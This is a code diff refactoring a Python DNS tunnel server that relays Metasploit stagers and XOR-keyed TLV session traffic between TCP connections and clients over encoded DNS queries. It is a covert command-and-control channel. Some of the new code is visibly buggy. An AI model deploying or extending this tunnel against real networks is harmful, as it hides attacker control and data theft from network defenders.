@@ -13,7 +13,6 @@ import threading
 import SocketServer
 import struct
 import re
-import ssl
 import Queue
 import base64
 import logging
@@ -24,7 +23,7 @@ from contextlib import contextmanager
 from abc import ABCMeta, abstractmethod
 import errno
 from collections import deque
-from functools import partial
+from functools import partial, wraps
 import types
 
 try:
@@ -60,7 +59,7 @@ class LoggedMeta(type):
 
 class WithLogger(object):
     __metaclass__ = LoggedMeta     
-    slots = ()
+    __slots__ = []
 
 
 def pack_byte_to_hn(val):
@@ -85,7 +84,7 @@ def pack_ushort_to_hn(val):
 
 
 def xor_bytes(key, data):
-    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))
+    return bytearray([data[i] ^ key[i % len(key)] for i in range(len(data))])
 
 
 @contextmanager
@@ -160,10 +159,21 @@ class ReactorObject(object):
 
 
 class RConnection(ReactorObject):
+    """
+    This class handles active socket communication
+    """
+
+    class Closed(Exception):
+        """
+        Exception raised when socket is closed
+        """
+        pass
+
     def __init__(self, sock, reactor=None):
         super(RConnection, self).__init__(sock, reactor)
         self.write_queue = deque()
         self.read_queue = deque()
+        self.closed = False
     
     def want_read(self):
         return len(self.read_queue) != 0
@@ -172,7 +182,21 @@ class RConnection(ReactorObject):
         return len(self.write_queue) != 0
 
     def read_data(self, size):
-        return self.fd.recv(size)
+        data = self.fd.recv(size)
+        if size != 0 and len(data) == 0:
+            raise RConnection.Closed("Connection is closed")
+        return data 
+
+    def close(self):
+        super(RConnection, self).close()
+        try:
+            for tsk in self.write_queue:
+                tsk.on_event(self, RConnectionTask.EVENT_ERROR)
+            for tsk in self.read_queue:
+                tsk.on_event(self, RConnectionTask.EVENT_ERROR)
+        finally:
+            self.write_queue.clear()
+            self.read_queue.clear()
 
     def send_data(self, data):
         return self.fd.send(data)
@@ -186,7 +210,12 @@ class RConnection(ReactorObject):
     def on_read(self):
         read_task = self._get_task(self.read_queue)
         if read_task:
-            read_task.on_event(self, RConnectionTask.EVENT_READ)
+            try:
+                read_task.on_event(self, RConnectionTask.EVENT_READ)
+            except RConnection.Closed:
+                self.close()
+            except:
+                raise
 
     def on_write(self):
         write_task = self._get_task(self.write_queue)
@@ -201,30 +230,28 @@ class RConnection(ReactorObject):
         self._notify()
 
     def task_done(self, task):
-        print("delete", task)
-        try:
+        with ignored(ValueError):
             self.read_queue.remove(task)
+        with ignored(ValueError):
             self.write_queue.remove(task)
-        except:
-            pass
 
-class RConnectionFactory(object):
+    def set_options(self, option_type, options_dict):
+        for k, v in options_dict.iteritems():
+            self.fd.setsockopt(option_type, k, v)
+
+class RConnectionFactory(WithLogger):
 
     def __init__(self, connection_cls = RConnection):
         self.connection_cls = connection_cls
 
     def create_connection(self, sock, address , reactor):
-        print("new connection")
         connection = self.connection_cls(sock)
-        task = RecieveTask(10)
-        task.run(connection)
         connection.add_to_loop(reactor)
         return connection
 
 class RListener(ReactorObject):
 
     def __init__(self, sock, reactor=None, connection_factory=RConnectionFactory(), **kwargs):
-        print(kwargs, reactor)
         super(RListener, self).__init__(sock, reactor)
         self.need_listen = True
         self.conn_factory = connection_factory
@@ -244,12 +271,12 @@ class RListener(ReactorObject):
 
     def on_read(self):
         sock, address = self.fd.accept()
-        print(self.conn_factory)
+        sock.setblocking(False)
         connection = self.conn_factory.create_connection(sock, address, self.reactor)
         return connection
 
     def on_write(self):
-        raise RuntimeError("on write have not be happens on listener")
+        raise RuntimeError("on_write have not be happens on listener")
 
 
 class RListenerFactory(object):
@@ -261,10 +288,10 @@ class RListenerFactory(object):
         return listener
 
 
-class FDReactor(object):
+class FDReactor(WithLogger):
     SELECT_TIMEOUT = 10
 
-    def __init__(self, loop_timeout=FDReactor.SELECT_TIMEOUT):
+    def __init__(self, loop_timeout=SELECT_TIMEOUT):
         pipe = os.pipe()
         self.poll_pipe = (os.fdopen(pipe[0], "r", 0), os.fdopen(pipe[1], "w", 0))
         self.thread = threading.Thread(target=self._loop)
@@ -275,8 +302,11 @@ class FDReactor(object):
         self.lock = threading.RLock()
         self.in_poll = False
         self.loop_timeout = loop_timeout
+        self.tasks = []
+        self.task_lock = threading.RLock()
 
     def create_listener(self, addr, port, listener_factory=RListenerFactory(), monitor=True):
+        self._logger.debug("Creating listener for %s:%d", addr, port)
         listener = None
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setblocking(False)
@@ -292,6 +322,7 @@ class FDReactor(object):
         listener = listener_factory.create_listener(sock, addr, port, reactor=self)
         if monitor:
             listener.add_to_loop()
+        self._logger.info("Listener for %s:%d is created.", addr, port)
         return listener
 
     def start_loop(self):
@@ -299,16 +330,27 @@ class FDReactor(object):
             raise RuntimeError("Can't start loop after shutdown")
 
         self.thread.start()
+        self._logger.info("Reactor loop has been started")
 
     def wait_finish(self):
         try:
             while self.thread.isAlive():
-                self.thread.join(1)
+                # self.thread.join(1)
+                time.sleep(1)
         except KeyboardInterrupt:
             self.shutdown()
+        finally:
+            self.thread.join()
 
     def shutdown(self):
-        self.shutdown_evt.set()
+        if not self.shutdown_evt.is_set():
+            self._logger.info("Shutdown loop.")
+            self.shutdown_evt.set()
+            self._pool()
+
+    def put_task(self, task):
+        with self.task_lock:
+            self.tasks.append(task)
         self._pool()
 
     def _add_to_loop(self, obj):
@@ -335,6 +377,9 @@ class FDReactor(object):
         self._pool()
 
     def _pool(self):
+        cur_thread = threading.current_thread()
+        if cur_thread.ident == self.thread.ident:
+            return
         with self.lock:
             if not self.in_poll:
                 self.poll_pipe[1].write("\x01")        
@@ -359,7 +404,7 @@ class FDReactor(object):
                     if c.want_read():
                         readers.append(fd)
                         map_fd[fd] = c
-                    elif c.want_write():
+                    if c.want_write():
                         writers.append(fd)
                         map_fd[fd] = c
 
@@ -377,6 +422,11 @@ class FDReactor(object):
             if write_lst:
                 for write_fd in write_lst:
                     map_fd[write_fd].on_write()
+
+            # run deffered task in the context of reactor thread
+            with self.task_lock:
+                for tsk in self.tasks:
+                    tsk.run()
             
         # cycle id ended.Close connections and clear arrays
         for l in self.listeners:
@@ -385,8 +435,9 @@ class FDReactor(object):
             c._close()
         self.listeners = []
         self.connections = []
-        os.close(self.poll_pipe[0])
-        os.close(self.poll_pipe[1])
+        self.poll_pipe[0].close()
+        self.poll_pipe[1].close()
+        self._logger.info("Reactor loop is ended")
 
 
 class RConnectionTask(object):
@@ -429,6 +480,7 @@ class RConnectionTask(object):
             return
 
         self.func_set[self.WORK_F](connection)
+        
         if (self.func_set[self.IS_DONE_F]()):
             connection.task_done(self)
             self.func_set[self.DONE_F](connection)
@@ -469,21 +521,26 @@ class RConnectionTask(object):
         return f
 
 
-class RecieveTask(RConnectionTask):
-    def __init__(self, size, complete_func=None):
-        super(RecieveTask, self).__init__(RConnectionTask.READ_TASK)
+class ReceiveTask(RConnectionTask):
+    def __init__(self, size, complete_func=None, error_func=None):
+        super(ReceiveTask, self).__init__(RConnectionTask.READ_TASK)
         self.need_read = size
         self.data = bytearray() 
         self.complete_func = complete_func
+        self.error_func = error_func
 
     def set_complete_func(self, complete_func=None):
         self.complete_func = complete_func
+
+    def set_error_func(self, error_func=None):
+        self.error_func = error_func
 
     @RConnectionTask.work_f
     def _receive_data(self, connection):
         data = connection.read_data(self.need_read)
         self.data.extend(data)
         data_len = len(data)
+        print("Length", data_len)
         self.need_read -= data_len
 
     @RConnectionTask.is_done_f
@@ -492,7 +549,7 @@ class RecieveTask(RConnectionTask):
 
     @RConnectionTask.error_f
     def _on_error(self):
-        print("Error")
+        pass
 
     @RConnectionTask.done_f
     def _done(self, connection):
@@ -510,6 +567,7 @@ class SendTask(RConnectionTask):
     @RConnectionTask.work_f
     def _send_data(self, connection):
         num_send = connection.send_data(self.data[self.idx:])
+        print(num_send)
         self.need_send -= num_send
         self.idx += num_send 
 
@@ -519,17 +577,16 @@ class SendTask(RConnectionTask):
 
     @RConnectionTask.error_f
     def _on_error(self):
-        print("error")
+        pass
 
     @RConnectionTask.done_f
     def _done(self, connection):
-        print("Done")
-        connection.close()
+        pass
 
 
 def connection_task(func):
-    if not isinstance(func, types.GeneratorType):
-        raise TypeError("Function instanse is not generator")
+    if not callable(func):
+        raise TypeError("Decorated object is not callable")
 
     def _callback_done(gen, *cb_args):
         try:
@@ -539,11 +596,14 @@ def connection_task(func):
         else:
             raise RuntimeError("generator object have to be produce only one yield")
 
+    @wraps(func)
     def decorated(*args, **kwargs):
         try:
             gen = func(*args, **kwargs)
+            if not isinstance(gen, types.GeneratorType):
+                raise RuntimeError("Function instanse is not generator")
             task, conn = next(gen)
-            if isinstance(task, RecieveTask):
+            if isinstance(task, ReceiveTask):
                 callback = partial(_callback_done, gen)
                 task.set_complete_func(callback)
             task.run(conn)
@@ -551,6 +611,20 @@ def connection_task(func):
             raise RuntimeError("Generator object for task have to be produce one yield")
 
     return decorated
+
+
+class DefferedTask(object):
+    """
+    Create object that calls function when run() is called
+    """
+    def __init__(self, func, *args, **kwargs):
+        self.func = func
+        self.args = args
+        self.kwargs = kwargs
+
+    def run(self):
+        return self.func(*self.args, **self.kwargs)
+
 
 class Encoder(object):
     MAX_PACKET_SIZE = -1
@@ -627,9 +701,9 @@ class IPv6Encoder(Encoder):
         data_size = len(data)
         res.append(pack_2byte_to_hn(prefix, (index << 4 if index < 16 else 0) | data_size))
         for i in range(data_size//2):
-            res.append(pack_2byte_to_hn(ord(data[i*2]), ord(data[i*2 + 1])))
+            res.append(pack_2byte_to_hn(data[i*2], data[i*2 + 1]))
         if data_size % 2 != 0:
-            res.append(pack_byte_to_hn(ord(data[data_size-1])))
+            res.append(pack_byte_to_hn(data[data_size-1]))
         return res
 
     @staticmethod
@@ -995,15 +1069,13 @@ class TimeoutService(object):
                 self.timer = None
 
 
-class Client(object):
+class Client(WithLogger):
     INITIAL = 1
     INCOMING_DATA = 2
 
     def __init__(self, domain):
         self.domain = domain
         self.state = self.INITIAL
-        self.logger = logging.getLogger(self.__class__.__name__)
-        # self.logger.setLevel(logging.DEBUG)
         self.received_data = PartedData()
         self.last_received_index = -1
         self.sub_domain = "aaaa"
@@ -1032,10 +1104,10 @@ class Client(object):
             self.client_id = client_id
             self.server_id = server_id
             self.register_for_server_needed = True
-            self.logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
+            self._logger.info("Registered new client with %s id for server_id %s", client_id, server_id)
             return encoder.encode_registration(client_id, 0)
         else:
-            self.logger.info("Can't register client")
+            self._logger.info("Can't register client")
             return encoder.encode_finish_send()
 
     def get_id(self):
@@ -1059,50 +1131,51 @@ class Client(object):
 
     def incoming_data_header(self, data_size, padding, encoder):
         if self.received_data.get_expected_size() == data_size and self.state == self.INCOMING_DATA:
-            self.logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
+            self._logger.info("Duplicated header request: waiting %d bytes of data with padding %d", data_size, padding)
             return encoder.encode_ready_receive()
         elif self.state == self.INCOMING_DATA:
-            self.logger.error("Bad request. Client in the receiving data state")
+            self._logger.error("Bad request. Client in the receiving data state")
             return None
-        self.logger.info("Data header: waiting %d bytes of data", data_size)
+        self._logger.info("Data header: waiting %d bytes of data", data_size)
         self._setup_receive(data_size, padding)
         return encoder.encode_ready_receive()
 
     def incoming_data(self, data, index, counter, encoder):
         self.logger.debug("Data %s, index %d", data, index)
         if self.state != self.INCOMING_DATA:
-            self.logger.error("Bad state(%d) for this action. Send finish.", self.state)
+            self._logger.error("Bad state(%d) for this action. Send finish.", self.state)
             return encoder.encode_finish_send()
 
         data_size = len(data)
         if data_size == 0:
-            self.logger.error("Empty incoming data. Send finish.")
+            self._logger.error("Empty incoming data. Send finish.")
             return encoder.encode_finish_send()
 
         if self.last_received_index >= index:
-            self.logger.info("Duplicated packet.")
+            self._logger.info("Duplicated packet.")
             return encoder.encode_send_more_data()
 
         try:
             self.received_data.add_part(data)
         except ValueError:
-            self.logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
+            self._logger.error("Overflow.Something was wrong. Send finish and clear all received data.")
             self._initial_state()
             return encoder.encode_finish_send()
 
         self.last_received_index = index
         if self.received_data.is_complete():
-            self.logger.info("All expected data is received")
+            self._logger.info("All expected data is received")
             try:
                 packet = base64.b32decode(self.received_data.get_data() + "=" * self.padding, True)
-                self.logger.info("Put decoded data to the server queue")
+                self._logger.info("Put decoded data to the server queue")
                 self.server_queue.put(packet)
                 self._initial_state()
                 if self.server:
-                    self.logger.info("Notify server")
-                    self.server.polling()
+                    self._logger.info("Notify server")
+                    task = self.server.get_new_data_task(self.server_queue)
+                    self.reactor.put_task(task)
             except Exception:
-                self.logger.error("Error during decode received data", exc_info=True)
+                self._logger.error("Error during decode received data", exc_info=True)
                 self._initial_state()
                 return encoder.encode_finish_send()
         return encoder.encode_send_more_data()
@@ -1115,10 +1188,10 @@ class Client(object):
 
             if not self.send_data:
                 with ignored(Queue.Empty):
-                    self.logger.info("Checking client queue...")
+                    self._logger.info("Checking client queue...")
                     data = self.client_queue.get_nowait()
                     self.send_data = BlockSizedData(data, encoder.MAX_PACKET_SIZE)
-                    self.logger.debug("New data found: size is %d", len(data))
+                    self._logger.debug("New data found: size is %d", len(data))
 
             data_size = 0
             if self.send_data:
@@ -1126,42 +1199,42 @@ class Client(object):
                 sub_domain = next_sub
                 data_size = self.send_data.get_size()
             else:
-                self.logger.info("No data for client.(%s)", "server" if self.server else "no server")
-            self.logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
+                self._logger.info("No data for client.(%s)", "server" if self.server else "no server")
+            self._logger.info("Send data header to client with domain %s and size %d", sub_domain, data_size)
             return encoder.encode_data_header(sub_domain, data_size)
         else:
-            self.logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
+            self._logger.info("Subdomain is different %s(request) - %s(client)", sub_domain, self.sub_domain)
             if sub_domain == "aaaa":
-                self.logger.info("MIGRATION.")
+                self._logger.info("MIGRATION.")
             self.sub_domain = sub_domain
             self.send_data = None
 
     def request_data(self, sub_domain, index, encoder):
-        self.logger.debug("request_data - %s, %d", sub_domain, index)
+        self._logger.debug("request_data - %s, %d", sub_domain, index)
         if sub_domain != self.sub_domain:
-            self.logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
+            self._logger.error("request_data: subdomains are not equal(%s-%s)", self.sub_domain, sub_domain)
             return None
 
         if not self.send_data:
-            self.logger.error("Bad request. There are no data.")
+            self._logger.error("Bad request. There are no data.")
             return None
 
         try:
             _, data = self.send_data.get_data(index)
-            self.logger.debug("request_data: return data %s", data)
+            self._logger.debug("request_data: return data %s", data)
             return encoder.encode_packet(data)
         except ValueError:
-            self.logger.error("request_data: index(%d) out of range.", index)
+            self._logger.error("request_data: index(%d) out of range.", index)
 
     def server_put_data(self, data):
-        self.logger.info("Server adds data to queue.")
+        self._logger.info("Server adds data to queue.")
         self.client_queue.put(data)
 
     def server_get_data(self, timeout=2):
-        self.logger.info("Checking server queue...")
+        self._logger.info("Checking server queue...")
         with ignored(Queue.Empty):
             data = self.server_queue.get(True, timeout)
-            self.logger.info("There are new data(length=%d) for the server", len(data))
+            self._logger.info("There are new data(length=%d) for the server", len(data))
             return data
 
     def server_has_data(self):
@@ -1205,10 +1278,58 @@ class StageClient(object):
     def get_domain(self):
         return None
 
-class Request(object):
+
+class SDnsConnector(WithLogger):
+    """
+    Socket - DNS _connector service.
+    """
+    def __init__(self):
+        self.socketMap = {}
+        self.dnsMap = {}
+
+    def register_socket(self, server_id):
+        proxy = ProxyConnector()
+        self.socketMap.get(server_id, []).append(proxy)
+
+    def register_dns(self, server_id):
+        pass
+
+
+class ProxyConnector(object):
+    __slots__ = ["send_queue", "recv_queue"]
+
+    def __init__(self, send_q=Queue.Queue(16), recv_q=Queue.Queue(16)):
+        self.send_queue = send_q
+        self.recv_queue = recv_q
+
+    def send(self, packet):
+        self.send_queue.put(packet)
+
+    def receive(self):
+        data = None
+        with ignored(Queue.Empty):
+            data = self.recv_queue.get_nowait()
+        return data
+
+    def create_paired(self):
+        return ProxyConnector(self.recv_queue, self.send_queue)
+
+    def change_queue(self, send_queue, recv_queue):
+        self.send_queue = send_queue
+        self.recv_queue = recv_queue
+
+
+def create_pair_connector(size=16):
+    first_queue = Queue.Queue(size)
+    second_queue = Queue.Queue(size)
+    first_proxy = ProxyConnector(first_queue, second_queue)
+    second_proxy = ProxyConnector(second_queue, first_proxy) 
+    return first_proxy, second_proxy
+
+
+class Request(WithLogger):
     EXPR = None
     OPTIONS = []
-    LOGGER = logging.getLogger("Request")
 
     @classmethod
     def match(cls, qname):
@@ -1225,7 +1346,7 @@ class Request(object):
         client_id = params.pop("client", None)
         if not client_id:
             if "new_client" in cls.OPTIONS:
-                Request.LOGGER.info("Create a new client.")
+                Request._logger.info("Create a new client.")
                 client = Client(domain)
         else:
             client = Registrator.instance().get_stage_client_for_server(client_id) if "stage_client" in cls.OPTIONS else \
@@ -1234,15 +1355,15 @@ class Request(object):
         if client:
             client_domain = client.get_domain()
             if client_domain and (client_domain != domain):
-                Request.LOGGER.info("This client registered for different domain(%s).Return.", client_domain)
+                Request._logger.info("This client registered for different domain(%s).Return.", client_domain)
                 return
 
-            Request.LOGGER.info("Request will be handled by class %s", cls.__name__)
+            Request._logger.info("Request will be handled by class %s", cls.__name__)
             client.update_last_request_ts()
             params["encoder"] = dns_cls.encoder
             return cls._handle_client(client, **params)
         else:
-            Request.LOGGER.error("Can't find client with name %s", client_id)
+            Request._logger.error("Can't find client with name %s", client_id)
 
     @classmethod
     def _handle_client(cls, client, **kwargs):
@@ -1324,12 +1445,10 @@ class IncomingNewClient(Request):
         return client.register_client(kwargs['server_id'], kwargs['encoder'])
 
 
-class DNSTunnelRequestHandler(object):
+class DNSTunnelRequestHandler(WithLogger):
     encoder = IPv6Encoder
 
     def __init__(self):
-        self.logger = logging.getLogger(self.__class__.__name__)
-        # self.logger.setLevel(logging.DEBUG)
         self.handlers_chain = [
             GetStageHeader,
             GetStageRequest,
@@ -1343,18 +1462,18 @@ class DNSTunnelRequestHandler(object):
     def process_request(self, sub_domain, domain):
         result = []
         if not sub_domain:
-            self.logger.error("Bad request: subdomain is empty %s", str(sub_domain))
+            self._logger.error("Bad request: subdomain is empty %s", str(sub_domain))
             return 
 
-        self.logger.info("requested subdomain name is %s", sub_domain)
+        self._logger.info("requested subdomain name is %s", sub_domain)
         for handler in self.handlers_chain:
             answer = handler.handle(sub_domain, domain, self.__class__)
             if answer:
-                self.logger.debug("Request for %s is handled successfully", sub_domain)
+                self._logger.debug("Request for %s is handled successfully", sub_domain)
                 result = answer
                 break
         else:
-            self.logger.error("Request with subdomain %s doesn't handled", sub_domain)
+            self._logger.error("Request with subdomain %s doesn't handled", sub_domain)
 
         return result
 
@@ -1555,30 +1674,52 @@ class LSClient(WithLogger):
 
     HEADER_SIZE = 32
     
-    def __init__(self, connection):
+    def __init__(self, connection, registrator=Registrator.instance()):
         self.connection = connection
         # enable keep-alive every minute
-        # sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        # sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 60)
-        # sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 4)
-        # sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 15)
-        # sock.setblocking(False)
+        self.connection.set_options(socket.SOL_SOCKET, {socket.SO_KEEPALIVE : 1})
+        self.connection.set_options(socket.SOL_TCP, {
+            socket.TCP_KEEPIDLE: 60,
+            socket.TCP_KEEPCNT: 4,
+            socket.TCP_KEEPINTVL: 15
+        })
         self.msf_id = ""
         self.client = None
+        self.registrator = registrator
         self._read_id_size()
+        self.stage_requested = False
+        self.wait_client = False
+
+    def _connection_error(self):
+        self._logger.info("Error or closed connection")
+        if self.client:
+            client_id = self.client.get_id()
+            if client_id:
+                self._logger.info("Unregister client with id %s", client_id)
+                self.registrator.unregister_client(client_id)
+            self.client.set_server(None)
+            self.client = None
+        self.registrator.unsubscribe(self.msf_id, self)
+
+    def _create_receive_task(self, size):
+        task = ReceiveTask(size)
+        task.set_error_func(self._connection_error)
+        return task
 
     @connection_task
     def _read_id_size(self):
-        task = RecieveTask(1)
+        task = self._create_receive_task(1) 
         yield task, self.connection
         id_size = struct.unpack("B", task.data)[0]
+        self._logger.info("id size is %d", id_size)
         self._read_id(id_size)
 
     @connection_task
     def _read_id(self, id_size):
-        task = RecieveTask(id_size)
+        task = self._create_receive_task(id_size)
         yield task, self.connection
-        self.msf_id = task.data
+        self.msf_id = task.data.decode()
+        self._logger.info("Got id = %s", self.msf_id)
         if self._setup_client():
             self._logger.info("New client is found.")
             self._read_status()
@@ -1586,24 +1727,25 @@ class LSClient(WithLogger):
             self._logger.info("There are no clients for server id %s. Create subscription",
                                   self.msf_id)
             self.wait_client = True
-            Registrator.instance().subscribe(self.msf_id, self)
+            self.registrator.subscribe(self.msf_id, self)
 
     @connection_task
     def _read_status(self):
-        task = RecieveTask(1)
+        task = self._create_receive_task(1)
         yield task, self.connection
         self._logger.info("Status request is read")
         send_data = "\x01"
         if self.client:
             self._logger.info("Client is exists, send true")
-            self._setup_tlv_reader()
+            self._read_tlv_header()
         elif self._setup_client():
             self._logger.info("New client is found, send true")
-            self._setup_tlv_reader()
+            self._read_tlv_header()
             self.wait_client = False
         else:
             self._logger.info("There are no clients, send false")
             send_data = "\x00"
+        self._send_status(send_data)
 
     @connection_task
     def _send_status(self, data):
@@ -1611,292 +1753,104 @@ class LSClient(WithLogger):
         yield task, self.connection
 
     def _setup_client(self):
-        return True
+        if not self.msf_id:
+            self._logger.error("There are no msf id!!!")
+            return False
+        client = self.registrator.get_new_client_for_server(self.msf_id)
+        if client:
+            self.client = client
+            client.set_server(self)
+            self._logger.info("Association client-server is done successfully(%s(%s)<->%s)",
+                                   self.msf_id, str(self), self.client.get_id())
+            return True
+        return False
 
     @connection_task
     def _read_stage_header(self):
         self._logger.info("Start reading stager")
-        task = RecieveTask(4)
+        task = self._create_receive_task(4)
         yield task, self.connection
         data_size = struct.unpack("<I", task.data)[0]
         self._logger.info("Stager size is %d bytes", data_size)
-        self._read_stage(data_size)
+        self._read_stage(data_size, task.data)
 
     @connection_task
-    def _read_stage(self, stage_size):
-        task = RecieveTask(stage_size)
+    def _read_stage(self, stage_size, data):
+        task = self._create_receive_task(stage_size)
         yield task, self.connection
         self._logger.info("Stage read is done")
-        Registrator.instance().add_stager_for_server(self.msf_id, task.data)
+        self.registrator.add_stager_for_server(self.msf_id, data+task.data)
         self._read_status()
 
     @connection_task
     def _read_tlv_header(self):
-        task = RecieveTask(self.HEADER_SIZE)
+        task = self._create_receive_task(self.HEADER_SIZE)
         yield task, self.connection
-        self._logger.debug("PARSE HEADER")
+        self._logger.debug("Parsing tlv header")
         header = task.data
         xor_key = header[:4]
         pkt_length_binary = xor_bytes(xor_key, header[24:28])
         pkt_length = struct.unpack('>I', pkt_length_binary)[0]
         self._logger.info("Packet length %d", pkt_length)
-        #return pkt_length+24, header
-        self._read_tlv_packet(pkt_length)
+        self._read_tlv_packet(pkt_length-8, header)
 
     @connection_task
-    def _read_tlv_packet(self, packet_size):
-        task = RecieveTask(packet_size)
+    def _read_tlv_packet(self, packet_size, data):
+        task = self._create_receive_task(packet_size)
         yield task, self.connection
-        MSFClient.LOGGER.info("All data from server is read. Sending to client.")
+        self._logger.info("All data from server is read. Sending to client.")
         if self.client:
-            self.client.server_put_data(task.data)
+            self.client.server_put_data(data + task.data)
         else:
-            MSFClient.LOGGER.error("Client for server id %s is not found.Dropping data", self.msf_id)
+            self._logger.error("Client for server id %s is not found.Dropping data", self.msf_id)
         self._read_tlv_header()
 
-
-class MSFClient(object):
-    HEADER_SIZE = 32
-    LOGGER = logging.getLogger("MSFClient")
-
-    def __init__(self, sock, server):
-        # enable keep-alive every minute
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 60)
-        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 4)
-        sock.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 15)
-        sock.setblocking(False)
-        self.sock = sock
-        self.server = server
-        self.msf_id = ""
+    def on_client_timeout(self):
+        self._logger.info("Closing connection.(client timeout)")
         self.client = None
-        self.wait_client = False
-        self.stage_requested = False
-        self.lock = threading.Lock()
-        self.client_event = threading.Event()
-        self.parted_reader = None
-        self._setup_id_reader()
-
-    def get_socket(self):
-        return self.sock if not self.wait_client else None
-
-    def _on_closing_connection(self):
-        if self.client:
-            client_id = self.client.get_id()
-            if client_id:
-                MSFClient.LOGGER.info("Unregister client with id %s", client_id)
-                Registrator.instance().unregister_client(client_id)
-            self.client.set_server(None)
-            self.client = None
-        Registrator.instance().unsubscribe(self.msf_id, self)
-        self.close()
-        self.server.remove_me(self)
-
-    def _read_data(self, size):
-        data = None
-        try:
-            data = self.sock.recv(size)
-            if not data:
-                MSFClient.LOGGER.info("Connection closed by msf")
-                self._on_closing_connection()
-                return None
-            return data
-        except:
-            # connection closed
-            MSFClient.LOGGER.error("Exception during read. Closing connection.", exc_info=True)
-            self._on_closing_connection()
-            return None
+        self.connection.close()
 
     def on_new_client(self):
-        with self.lock:
-            if not self.client:
-                if self._setup_client():
-                    self._setup_status_request_reader()
-                    Registrator.instance().unsubscribe(self.msf_id, self)
-                    self.wait_client = False
-                    self.polling()
-            else:
-                self.LOGGER.error("Client already exists for this server")
+        if not self.client:
+            if self._setup_client():
+                self._read_status()
+                self.registrator.unsubscribe(self.msf_id, self)
+                self.wait_client = False
+        else:
+            self._logger.error("Client already exists for this server")
 
     def request_stage(self):
-        with self.lock:
-            if not self.stage_requested:
-                self._setup_stage_reader()
-                self.stage_requested = True
-                self.wait_client = False
-                self.polling()
-            else:
-                MSFClient.LOGGER.info("Stage has already was requested on this server")
-
-    def _setup_id_reader(self):
-        # self.parted_reader = PartedDataReader(read_func=self._read_data,
-        #                                      header_func=self._read_id_header,
-        #                                      completion_func=self._read_id_complete
-        #                                      )
-        pass
-
-    def _setup_tlv_reader(self):
-        self.parted_reader = PartedDataReader(read_func=self._read_data,
-                                              header_func=self._read_tlv_header,
-                                              completion_func=self._read_tlv_complete
-                                              )
-
-    def _setup_stage_reader(self, without_data=False):
-        self.parted_reader = PartedDataReader(read_func=self._read_data,
-                                              header_func=self._read_stage_header,
-                                              completion_func=self._read_stage_complete_data_drop if without_data else
-                                                              self._read_stage_complete
-                                              )
-    
-    def _setup_status_request_reader(self):
-        self.parted_reader = PartedDataReader(read_func=self._read_data,
-                                              header_func=self._read_status_request,
-                                              completion_func=self._read_status_complete
-                                              )
-
-    def _read_id_header(self, data):
-        id_size_byte = self._read_data(1)
-        if id_size_byte and len(id_size_byte) == 1:
-            id_size = struct.unpack("B", id_size_byte)[0]
-            return id_size, None
-        else:
-            return 0, None
-
-    def _read_id_complete(self, data):
-        MSFClient.LOGGER.info("Id read is done")
-        self.msf_id = data.get_data()
-        if self._setup_client():
-            MSFClient.LOGGER.info("New client is found.")
-            self._setup_status_request_reader()
-        else:
-            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription",
-                                  self.msf_id)
-            self.parted_reader = None
-            self.wait_client = True
-            Registrator.instance().subscribe(self.msf_id, self)
-
-    def _read_stage_header(self, data):
-        MSFClient.LOGGER.info("Start reading stager")
-        data_size_b = self._read_data(4)
-        if data_size_b and len(data_size_b) == 4:
-            data_size = struct.unpack("<I", data_size_b)[0]
-            MSFClient.LOGGER.info("Stager size is %d bytes", data_size)
-            return data_size+4, data_size_b
-        else:
-            return 0, None
-
-    def _read_stage_complete(self, data):
-        MSFClient.LOGGER.info("Stage read is done")
-        Registrator.instance().add_stager_for_server(self.msf_id, data.get_data())
-        self._setup_status_request_reader()
-
-    def _read_status_request(self, data):
-        MSFClient.LOGGER.info("Start reading status request")
-        data_size = 1
-        return data_size, None
-
-    def _read_status_complete(self, data):
-        MSFClient.LOGGER.info("Status request is read")
-        if self.client:
-            MSFClient.LOGGER.info("Client is exists, send true")
-            self.sock.send("\x01")
-            self._setup_tlv_reader()
-        elif self._setup_client():
-            MSFClient.LOGGER.info("New client is found, send true")
-            self.sock.send("\x01")
-            self._setup_tlv_reader()
+        if not self.stage_requested:
+            self._read_stage_header()
+            self.stage_requested = True
             self.wait_client = False
         else:
-            MSFClient.LOGGER.info("There are no clients, send false")
-            self.sock.send("\x00")
-
-    def _read_stage_complete_data_drop(self, data):
-        MSFClient.LOGGER.info("Stage read is done. Drop data and continue.")
-        if self._setup_client():
-            MSFClient.LOGGER.info("Client is found.Setup tlv reader.")
-            self._setup_tlv_reader()
-        else:
-            MSFClient.LOGGER.info("There are no clients for server id %s. Create subscription", self.msf_id)
-            self.parted_reader = None
-            self.wait_client = True
-            Registrator.instance().subscribe(self.msf_id, self)
-
-    def _read_tlv_header(self, data):
-        header = self._read_data(MSFClient.HEADER_SIZE - len(data))
-        if not header:
-            return 0, None
-
-        header = data + header
-        if len(header) != MSFClient.HEADER_SIZE:
-            MSFClient.LOGGER.info("Can't read full header(%s - %d)", self.sock, len(header))
-            return -1, header
-
-        if len(data) != 0:
-            MSFClient.LOGGER.info("Full header is read succesfully(%s)", self.sock)
-        MSFClient.LOGGER.debug("PARSE HEADER")
-        xor_key = header[:4]
-        pkt_length_binary = xor_bytes(xor_key, header[24:28])
-        pkt_length = struct.unpack('>I', pkt_length_binary)[0]
-        MSFClient.LOGGER.info("Packet length %d", pkt_length)
-        return pkt_length+24, header
-
-    def _read_tlv_complete(self, data):
-        MSFClient.LOGGER.info("All data from server is read. Sending to client.")
-        if self.client:
-            self.client.server_put_data(data.get_data())
-        else:
